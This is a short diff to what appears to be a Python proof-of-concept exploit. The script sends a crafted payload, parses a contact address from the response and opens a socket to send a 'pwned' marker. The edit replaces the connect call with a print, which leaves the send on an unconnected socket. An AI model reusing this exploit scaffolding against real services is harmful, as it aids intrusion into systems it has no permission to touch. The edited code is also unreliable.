@@ -106,8 +106,9 @@ def main(args):
 		con.send(BODY.encode("ascii"))
 		con_ip, con_port = search(contact_pattern, contact).group().split(':')
 		s2 = socket(AF_INET, SOCK_STREAM)
-		s2.connect((con_ip, args.pwn_port))
+		print(con_ip, con_port)
 		s2.send(b'pwned')
+		s2.send(b'pwned\n')
 		s2.close()
 
 		con.close()
